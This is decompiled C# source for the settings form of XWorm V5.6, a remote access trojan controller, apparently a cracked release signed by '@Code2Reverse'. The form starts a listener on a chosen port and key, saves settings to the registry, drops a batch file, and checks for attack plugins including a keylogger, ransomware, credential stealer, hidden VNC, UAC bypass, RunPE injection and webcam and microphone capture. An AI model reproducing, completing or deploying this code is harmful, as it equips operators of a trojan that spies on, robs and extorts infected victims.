#define DEBUG
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Guna.UI2.WinForms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;


namespace XWorm;

[DesignerGenerated]
public class Port : Form
{
	[CompilerGenerated]
	internal sealed class _Closure_0024__R40_002D0
	{
		public GClass8 _0024VB_0024NonLocal_2;

		[SpecialName]
		[DebuggerHidden]
		internal void _Lambda_0024__R2(object a0)
		{
			_0024VB_0024NonLocal_2.method_0(Conversions.ToInteger(a0));
		}
	}

	[CompilerGenerated]
	private sealed class VB_0024StateMachine_40_connect : IAsyncStateMachine
	{
		public int _0024State;

		public AsyncVoidMethodBuilder _0024Builder;

		internal Port _0024VB_0024Me;

		internal _Closure_0024__R40_002D0 _Closure_0024__R40_002D0_0;

		internal Thread _0024VB_0024ResumableLocal_listener_00241;

		internal Exception _0024VB_0024ResumableLocal_ex_00242;

		internal TaskAwaiter _0024A0;

		[CompilerGenerated]
		internal void MoveNext()
		{
			int num = _0024State;
			try
			{
				if ((uint)num <= 1u)
				{
				}
				try
				{
					TaskAwaiter awaiter;
					switch (num)
					{
					default:
						awaiter = Task.Delay(5000).GetAwaiter();
						if (!awaiter.IsCompleted)
						{
							num = 0;
							_0024State = 0;
							_0024A0 = awaiter;
							ref AsyncVoidMethodBuilder reference = ref _0024Builder;
							VB_0024StateMachine_40_connect stateMachine = this;
							reference.AwaitUnsafeOnCompleted(ref awaiter, ref stateMachine);
							return;
						}
						break;
					case 1:
						num = -1;
						_0024State = -1;
						return;
					case 0:
						num = -1;
						_0024State = -1;
						awaiter = _0024A0;
						_0024A0 = default(TaskAwaiter);
						break;
					}
					awaiter.GetResult();
					awaiter = default(TaskAwaiter);
					MyProject.Forms.Main.gclass8_0 = new GClass8();
					_Closure_0024__R40_002D0_0 = new _Closure_0024__R40_002D0();
					_Closure_0024__R40_002D0_0._0024VB_0024NonLocal_2 = MyProject.Forms.Main.gclass8_0;
					_0024VB_0024ResumableLocal_listener_00241 = new Thread([SpecialName] [DebuggerHidden] (object a0) =>
					{
						_Closure_0024__R40_002D0_0._0024VB_0024NonLocal_2.method_0(Conversions.ToInteger(a0));
					});
					_0024VB_0024ResumableLocal_listener_00241.Start(GClass19.int_0);
					_0024VB_0024ResumableLocal_listener_00241.Join();
					GClass19.int_1 = 1;
					Module0.smethod_3("Listenning " + Conversions.ToString(GClass19.int_0), Color.Green);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception ex2 = ex;
					_0024VB_0024ResumableLocal_ex_00242 = ex2;
					Debug.WriteLine(_0024VB_0024ResumableLocal_ex_00242.Message);
					ProjectData.ClearProjectError();
				}
			}
			catch (Exception ex3)
			{
				ProjectData.SetProjectError(ex3);
				Exception exception = ex3;
				_0024State = -2;
				_0024Builder.SetException(exception);
				ProjectData.ClearProjectError();
				return;
			}
			num = -2;
			_0024State = -2;
			_0024Builder.SetResult();
		}

		void IAsyncStateMachine.MoveNext()
		{
			//ILSpy generated this explicit interface implementation from .override directive in MoveNext
			this.MoveNext();
		}

		[DebuggerNonUserCode]
		void IAsyncStateMachine.SetStateMachine(IAsyncStateMachine stateMachine)
		{
		}
	}

	private IContainer components;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox4")]
	private Guna2TextBox _Guna2TextBox4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2GradientButton1")]
	private Guna2GradientButton _Guna2GradientButton1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox2")]
	private Guna2TextBox _Guna2TextBox2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Guna2TextBox1")]
	private Guna2TextBox _Guna2TextBox1;

    [field: AccessedThroughProperty("Guna2ToggleSwitch1")]
    public Guna2ToggleSwitch Guna2ToggleSwitch1
    ;

    [field: AccessedThroughProperty("Label7")]
    public Label Label7;


    [field: AccessedThroughProperty("Label6")]
    public Label Label6
;


    public Guna2TextBox Guna2TextBox4;

    public Guna2GradientButton Guna2GradientButton1;


    [field: AccessedThroughProperty("Label9")]
    public Label Label9;


    public Guna2TextBox Guna2TextBox2;


    [field: AccessedThroughProperty("Label10")]
    public Label Label10
    ;

    public Guna2TextBox Guna2TextBox1;


    [DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(XWorm.Port));
		this.Guna2ToggleSwitch1 = new Guna.UI2.WinForms.Guna2ToggleSwitch();
		this.Label7 = new System.Windows.Forms.Label();
		this.Label6 = new System.Windows.Forms.Label();
		this.Guna2TextBox4 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Guna2GradientButton1 = new Guna.UI2.WinForms.Guna2GradientButton();
		this.Label9 = new System.Windows.Forms.Label();
		this.Guna2TextBox2 = new Guna.UI2.WinForms.Guna2TextBox();
		this.Label10 = new System.Windows.Forms.Label();
		this.Guna2TextBox1 = new Guna.UI2.WinForms.Guna2TextBox();
		base.SuspendLayout();
        this.Guna2TextBox4.TextChanged += new System.EventHandler(this.Guna2TextBox4_TextChanged);
        this.Guna2TextBox4.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Guna2TextBox4_TextChanged);
        this.Guna2GradientButton1.Click += new System.EventHandler(this.Guna2GradientButton1_Click);
        this.Guna2TextBox2.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Guna2TextBox2_KeyDown);
        this.Guna2TextBox1.TextChanged += new System.EventHandler(this.Guna2TextBox1_TextChanged);
        this.Guna2TextBox1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.Guna2TextBox1_KeyDown);
        this.Guna2ToggleSwitch1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(138, 36, 102);
		this.Guna2ToggleSwitch1.CheckedState.FillColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2ToggleSwitch1.CheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch1.CheckedState.InnerColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch1.Location = new System.Drawing.Point(175, 123);
		this.Guna2ToggleSwitch1.Name = "Guna2ToggleSwitch1";
		this.Guna2ToggleSwitch1.Size = new System.Drawing.Size(35, 20);
		this.Guna2ToggleSwitch1.TabIndex = 53;
		this.Guna2ToggleSwitch1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(117, 50, 185);
		this.Guna2ToggleSwitch1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(136, 200, 236);
		this.Guna2ToggleSwitch1.UncheckedState.InnerBorderColor = System.Drawing.Color.White;
		this.Guna2ToggleSwitch1.UncheckedState.InnerColor = System.Drawing.Color.White;
		this.Label7.AutoSize = true;
		this.Label7.Location = new System.Drawing.Point(216, 127);
		this.Label7.Name = "Label7";
		this.Label7.Size = new System.Drawing.Size(61, 13);
		this.Label7.TabIndex = 52;
		this.Label7.Text = "Notification";
		this.Label6.AutoSize = true;
		this.Label6.Location = new System.Drawing.Point(19, 80);
		this.Label6.Name = "Label6";
		this.Label6.Size = new System.Drawing.Size(32, 13);
		this.Label6.TabIndex = 51;
		this.Label6.Text = "Key :";
		this.Guna2TextBox4.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox4.BorderRadius = 3;
		this.Guna2TextBox4.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox4.DefaultText = "<123456789>";
		this.Guna2TextBox4.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox4.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox4.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox4.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox4.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox4.IconLeft = (System.Drawing.Image)resources.GetObject("Guna2TextBox4.IconLeft");
		this.Guna2TextBox4.Location = new System.Drawing.Point(57, 77);
		this.Guna2TextBox4.Name = "Guna2TextBox4";
		this.Guna2TextBox4.PasswordChar = '\0';
		this.Guna2TextBox4.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox4.PlaceholderText = "";
		this.Guna2TextBox4.SelectedText = "";
		this.Guna2TextBox4.Size = new System.Drawing.Size(231, 21);
		this.Guna2TextBox4.TabIndex = 50;
		this.Guna2GradientButton1.BorderRadius = 4;
		this.Guna2GradientButton1.DisabledState.BorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.CustomBorderColor = System.Drawing.Color.DarkGray;
		this.Guna2GradientButton1.DisabledState.FillColor = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.FillColor2 = System.Drawing.Color.FromArgb(169, 169, 169);
		this.Guna2GradientButton1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(141, 141, 141);
		this.Guna2GradientButton1.FillColor2 = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2GradientButton1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2GradientButton1.ForeColor = System.Drawing.Color.White;
		this.Guna2GradientButton1.Image = (System.Drawing.Image)resources.GetObject("Guna2GradientButton1.Image");
		this.Guna2GradientButton1.ImageAlign = System.Windows.Forms.HorizontalAlignment.Left;
		this.Guna2GradientButton1.ImageSize = new System.Drawing.Size(17, 17);
		this.Guna2GradientButton1.Location = new System.Drawing.Point(12, 154);
		this.Guna2GradientButton1.Name = "Guna2GradientButton1";
		this.Guna2GradientButton1.Size = new System.Drawing.Size(276, 34);
		this.Guna2GradientButton1.TabIndex = 49;
		this.Guna2GradientButton1.Text = "Start";
		this.Label9.AutoSize = true;
		this.Label9.Location = new System.Drawing.Point(14, 27);
		this.Label9.Name = "Label9";
		this.Label9.Size = new System.Drawing.Size(37, 13);
		this.Label9.TabIndex = 46;
		this.Label9.Text = "Auth :";
		this.Guna2TextBox2.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox2.BorderRadius = 3;
		this.Guna2TextBox2.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox2.DefaultText = "";
		this.Guna2TextBox2.Text = "@Code2Reverse";
		this.Guna2TextBox2.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox2.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox2.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox2.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox2.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox2.IconLeft = (System.Drawing.Image)resources.GetObject("Guna2TextBox2.IconLeft");
		this.Guna2TextBox2.Location = new System.Drawing.Point(57, 23);
		this.Guna2TextBox2.Name = "Guna2TextBox2";
		this.Guna2TextBox2.PasswordChar = '\0';
		this.Guna2TextBox2.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox2.PlaceholderText = "";
		this.Guna2TextBox2.SelectedText = "";
		this.Guna2TextBox2.Size = new System.Drawing.Size(231, 21);
		this.Guna2TextBox2.TabIndex = 45;
		this.Label10.AutoSize = true;
		this.Label10.Location = new System.Drawing.Point(17, 53);
		this.Label10.Name = "Label10";
		this.Label10.Size = new System.Drawing.Size(34, 13);
		this.Label10.TabIndex = 44;
		this.Label10.Text = "Port :";
		this.Guna2TextBox1.BorderColor = System.Drawing.Color.FromArgb(40, 192, 182);
		this.Guna2TextBox1.BorderRadius = 3;
		this.Guna2TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam;
		this.Guna2TextBox1.DefaultText = "7000";
		this.Guna2TextBox1.DisabledState.BorderColor = System.Drawing.Color.FromArgb(208, 208, 208);
		this.Guna2TextBox1.DisabledState.FillColor = System.Drawing.Color.FromArgb(226, 226, 226);
		this.Guna2TextBox1.DisabledState.ForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.DisabledState.PlaceholderForeColor = System.Drawing.Color.FromArgb(138, 138, 138);
		this.Guna2TextBox1.FocusedState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.Font = new System.Drawing.Font("Segoe UI", 9f);
		this.Guna2TextBox1.ForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.HoverState.BorderColor = System.Drawing.Color.FromArgb(94, 148, 255);
		this.Guna2TextBox1.IconLeft = (System.Drawing.Image)resources.GetObject("Guna2TextBox1.IconLeft");
		this.Guna2TextBox1.Location = new System.Drawing.Point(57, 50);
		this.Guna2TextBox1.Name = "Guna2TextBox1";
		this.Guna2TextBox1.PasswordChar = '\0';
		this.Guna2TextBox1.PlaceholderForeColor = System.Drawing.Color.Black;
		this.Guna2TextBox1.PlaceholderText = "";
		this.Guna2TextBox1.SelectedText = "";
		this.Guna2TextBox1.Size = new System.Drawing.Size(231, 21);
		this.Guna2TextBox1.TabIndex = 43;
		base.AutoScaleDimensions = new System.Drawing.SizeF(6f, 13f);
		base.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
		base.AutoSizeMode = System.Windows.Forms.AutoSizeMode.GrowAndShrink;
		this.BackColor = System.Drawing.Color.White;
		base.ClientSize = new System.Drawing.Size(300, 200);
		base.Controls.Add(this.Guna2ToggleSwitch1);
		base.Controls.Add(this.Label7);
		base.Controls.Add(this.Label6);
		base.Controls.Add(this.Guna2TextBox4);
		base.Controls.Add(this.Guna2GradientButton1);
		base.Controls.Add(this.Label9);
		base.Controls.Add(this.Guna2TextBox2);
		base.Controls.Add(this.Label10);
		base.Controls.Add(this.Guna2TextBox1);
		base.Icon = (System.Drawing.Icon)resources.GetObject("$this.Icon");
		base.MaximizeBox = false;
		base.MinimizeBox = false;
		base.Name = "Port";
		base.ShowInTaskbar = false;
		base.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
		this.Text = "XWorm V5.6 Edition by @Code2Reverse | Settings";
		base.TopMost = true;
		base.ResumeLayout(false);
		base.PerformLayout();
	}

	public Port()
	{
		base.Closing += Port_Closing;
		base.Load += Port_Load;
		InitializeComponent();
		if (!Module0.smethod_0())
		{
			MessageBox.Show(this, "Please check internet connection!", Text, MessageBoxButtons.OK, MessageBoxIcon.Exclamation);
			Environment.Exit(0);
		}
		base.Opacity = 0.0;
		Module0.smethod_18(this, 5);
		Guna2TextBox1.Select();
	}

	[AsyncStateMachine(typeof(VB_0024StateMachine_40_connect))]
	[DebuggerStepThrough]
	public void method_0()
	{
		VB_0024StateMachine_40_connect stateMachine = new VB_0024StateMachine_40_connect();
		stateMachine._0024VB_0024Me = this;
		stateMachine._0024State = -1;
		stateMachine._0024Builder = AsyncVoidMethodBuilder.Create();
		stateMachine._0024Builder.Start(ref stateMachine);
	}

	private void Port_Closing(object sender, CancelEventArgs e)
	{
		try
		{
			Environment.Exit(0);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Port_Load(object sender, EventArgs e)
	{
		try
		{
			if (!Directory.Exists(Path.Combine(Application.StartupPath, "Sounds")))
			{
				Directory.CreateDirectory(Path.Combine(Application.StartupPath, "Sounds"));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Debug.WriteLine(ex.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path = Path.Combine(Application.StartupPath, "Fixer.bat");
			if (!File.Exists(path))
			{
				File.WriteAllText(path, XWorm_Resources.Fixer);
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Debug.WriteLine(ex2.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path2 = Path.Combine(Application.StartupPath, "Sounds", "Intro.wav");
			if (!File.Exists(path2))
			{
				File.WriteAllBytes(path2, XWorm_Resources.Intro);
			}
		}
		catch (Exception ex3)
		{
			ProjectData.SetProjectError(ex3);
			Debug.WriteLine(ex3.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
			string path3 = Path.Combine(Application.StartupPath, "Sounds", "Chat.wav");
			if (!File.Exists(path3))
			{
				File.WriteAllBytes(path3, XWorm_Resources.Chat);
			}
		}
		catch (Exception ex4)
		{
			ProjectData.SetProjectError(ex4);
			Debug.WriteLine(ex4.Message);
			ProjectData.ClearProjectError();
		}
		try
		{
		

			//Guna2TextBox2.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "License", null));
			if (Operators.ConditionalCompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "NoteF", null), "True", TextCompare: false))
			{
				Guna2ToggleSwitch1.Checked = true;
			}
			else
			{
				Guna2ToggleSwitch1.Checked = false;
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Port", null), null, TextCompare: false))))
			{
				Guna2TextBox1.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Port", null));
			}
			if (Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Key", null), null, TextCompare: false))))
			{
				Guna2TextBox4.Text = Conversions.ToString(MyProject.Computer.Registry.GetValue(GClass19.string_4, "Key", null));
			}
		}
		catch (Exception ex5)
		{
			ProjectData.SetProjectError(ex5);
			Debug.WriteLine(ex5.Message);
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2GradientButton1_Click(object sender, EventArgs e)
	{
	
			try
			{
				GClass19.int_0 = Conversions.ToInteger(Guna2TextBox1.Text);
				GClass19.string_1 = Guna2TextBox4.Text;
				GClass19.strings_0 = new List<string>();
				GClass19.string_3 = Environment.UserName;
				GClass19.string_5 = "@Code2Reverse";
                MyProject.Computer.Registry.SetValue(GClass19.string_4, "License", "@Code2Reverse");
				MyProject.Computer.Registry.SetValue(GClass19.string_4, "Port", Guna2TextBox1.Text);
				MyProject.Computer.Registry.SetValue(GClass19.string_4, "Key", Guna2TextBox4.Text);
				if (Guna2ToggleSwitch1.Checked)
				{
					GClass19.bool_0 = true;
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "NoteF", "True");
				}
				else
				{
					GClass19.bool_0 = false;
					MyProject.Computer.Registry.SetValue(GClass19.string_4, "NoteF", "False");
				}
				string[] array = Strings.Split("ActiveWindows.dll,Chat.dll,Clipboard.dll,FileManager.dll,FilesSearcher.dll,HRDP.dll,HVNC.dll,Informations.dll,Keylogger.dll,Maps.dll,Microphone.dll,Ngrok-Installer.dll,Options.dll,Pastime.dll,Performance.dll,ProcessManager.dll,Programs.dll,Ransomware.dll,Chromium.dll,Recovery.dll,Stealer.dll,Regedit.dll,RemoteDesktop.dll,ReverseProxy.dll,RunPE.dll,Shell.dll,StartupManager.dll,TCPConnections.dll,UACBypass.dll,VB.NET Compiler.dll,WebCam.dll,WSound.dll,ServiceManager.dll,MessageBox.dll,HVNCMemory.dll,Cmstp-Bypass.dll,HiddenApps.dll,HBrowser.dll,VoiceChat.dll", ",");
				foreach (string text in array)
				{
					if (!File.Exists("Plugins\\" + text))
					{
						Interaction.MsgBox("Missing dll >> " + text);
					}
				}
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Debug.WriteLine(ex.Message);
				ProjectData.ClearProjectError();
			}
			try
			{
				GClass10.main_0 = MyProject.Forms.Main;
				MyProject.Forms.Main.Timer_Status.Start();
				GClass4.smethod_0(MyProject.Forms.Main.Lv1);
				GClass4.smethod_0(MyProject.Forms.Main.Lv2);
				GClass4.smethod_0(MyProject.Forms.Main.Lv3);
				GClass4.smethod_0(MyProject.Forms.Main.Lv4);
				method_0();
				Hide();
				MyProject.Forms.Main.Show();
				return;
			}
			catch (Exception ex2)
			{
				ProjectData.SetProjectError(ex2);
				Debug.WriteLine(ex2.Message);
				ProjectData.ClearProjectError();
				return;
			}
	}

	private void Guna2TextBox2_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			if (Guna2GradientButton1.Enabled)
			{
				Guna2GradientButton1.PerformClick();
			}
		}
	}

	private void Guna2TextBox1_TextChanged(object sender, EventArgs e)
	{
		try
		{
			Conversions.ToInteger(Guna2TextBox1.Text);
			if ((Conversions.ToInteger(Guna2TextBox1.Text) > 65534) | (Conversions.ToInteger(Guna2TextBox1.Text) < 1))
			{
				Guna2GradientButton1.Enabled = false;
			}
			else
			{
				Guna2GradientButton1.Enabled = true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Guna2GradientButton1.Enabled = false;
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox1_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			if (Guna2GradientButton1.Enabled)
			{
				Guna2GradientButton1.PerformClick();
			}
		}
	}

	private void Guna2TextBox4_TextChanged(object sender, EventArgs e)
	{
		try
		{
			if ((Guna2TextBox4.Text.Length > 32) | (Guna2TextBox4.Text.Length < 1))
			{
				Guna2GradientButton1.Enabled = false;
			}
			else
			{
				Guna2GradientButton1.Enabled = true;
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Guna2GradientButton1.Enabled = false;
			ProjectData.ClearProjectError();
		}
	}

	private void Guna2TextBox4_KeyDown(object sender, KeyEventArgs e)
	{
		if (e.KeyCode == Keys.Return)
		{
			e.SuppressKeyPress = true;
			if (Guna2GradientButton1.Enabled)
			{
				Guna2GradientButton1.PerformClick();
			}
		}
	}
}


//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower




//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower




//By @Code2Reverse - @Unpack2File - Screw you @TheHellTower


